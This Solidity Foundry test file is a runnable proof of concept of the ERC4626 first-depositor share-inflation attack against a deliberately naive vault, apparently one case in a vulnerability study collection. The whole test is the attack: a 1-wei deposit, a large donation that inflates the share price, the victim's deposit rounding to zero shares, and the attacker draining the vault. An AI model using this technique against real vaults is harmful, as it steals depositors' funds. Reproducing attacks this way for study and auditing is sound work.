// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../src/common/MockERC20.sol";
import {NaiveVault} from "../../src/case001_erc4626_inflation/NaiveVault.sol";

/// @notice Runnable proof for case001 — ERC4626 first-depositor share inflation.
///         A PASSING test means the exploit succeeded: the attacker captured the
///         victim's entire deposit and the victim received zero shares.
contract InflationPoC is Test {
    MockERC20 internal asset;
    NaiveVault internal vault;
    address internal attacker;
    address internal victim;

    function setUp() public {
        asset = new MockERC20("Asset", "AST");
        vault = new NaiveVault(asset);
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
    }

    function test_firstDepositorInflationStealsVictimDeposit() public {
        uint256 donation = 100e18;
        uint256 victimDeposit = 100e18;

        // Attacker bootstraps the vault with a single wei of shares.
        asset.mint(attacker, 1 + donation);
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        // ...then donates directly to the vault to inflate the share price.
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        // Victim makes a fair-sized deposit but rounds down to ZERO shares.
        asset.mint(victim, victimDeposit);
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(victimDeposit);
        vm.stopPrank();

        assertEq(vault.shares(victim), 0, "victim should be ground to zero shares");

        // Attacker redeems the single share and drains the whole vault.
        // Hoist the share read BEFORE the prank: a cheatcode prank is single-shot and
        // an external read in the call argument would consume it.
        uint256 attackerShares = vault.shares(attacker);
        uint256 balBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(attackerShares);
        uint256 profit = asset.balanceOf(attacker) - balBefore;

        uint256 cost = 1 + donation;
        assertGe(profit, cost + victimDeposit, "attacker failed to capture the victim deposit");
        emit log_named_decimal_uint("attacker net stolen", profit - cost, 18);
    }
}
